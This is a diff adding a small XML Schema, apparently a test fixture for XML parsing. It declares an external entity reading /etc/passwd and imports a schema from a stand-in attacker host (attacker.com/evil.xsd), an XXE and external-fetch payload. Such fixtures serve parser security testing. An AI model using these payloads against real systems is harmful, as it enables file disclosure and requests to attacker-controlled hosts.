@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE schema PUBLIC "-//W3C//DTD XMLSchema 200102//EN" "" [
+   <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
+  <xs:import namespace="test" schemaLocation="http://www.attacker.com/evil.xsd"/>
+  <xs:element name="note">
+    <xs:complexType>
+      <xs:sequence>
+        <xs:element name="to" type="xs:string"/>
+        <xs:element name="from" type="xs:string"/>
+        <xs:element name="heading" type="xs:string"/>
+        <xs:element name="body" type="xs:string"/>
+      </xs:sequence>
+    </xs:complexType>
+  </xs:element>
+</xs:schema>
